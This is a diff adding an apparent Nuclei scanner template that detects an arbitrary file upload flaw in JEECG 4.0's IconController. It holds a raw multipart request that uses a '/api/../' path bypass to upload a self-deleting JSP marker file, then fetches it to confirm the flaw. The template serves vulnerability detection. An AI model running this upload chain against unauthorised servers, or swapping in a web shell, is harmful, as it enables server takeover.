@@ -1,0 +1,61 @@
+id: jeecg-4-0-iconcontroller-file-upload
+
+info:
+  name: JEECG 4.0 IconController Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    JEECG is a J2EE rapid development platform. There is a file upload vulnerability in IconController of JEECG 4.0, where attackers can upload malicious files to control the server.
+  tags: file-upload
+  reference:
+    - https://gitee.com/jeecg/jeecg
+    - https://forum.butian.net/share/987
+
+http:
+  - raw:
+      - |
+        POST /api/../iconController.do?saveOrUpdateIcon HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="name"
+
+        123.jsp
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="id"
+
+        
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="iconName"
+
+        dd
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="iconType"
+
+        1
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw
+        Content-Disposition: form-data; name="file"; filename="123.jsp"
+        Content-Type: application/octet-stream
+
+        <%out.println(new String(new sun.misc.BASE64Decoder().decodeBuffer("ZTE2NTQyMTExMGJhMDMwOTlhMWMwMzkzMzczYzViNDM=")));new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /plug-in/accordion/images/123.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
+        part: body
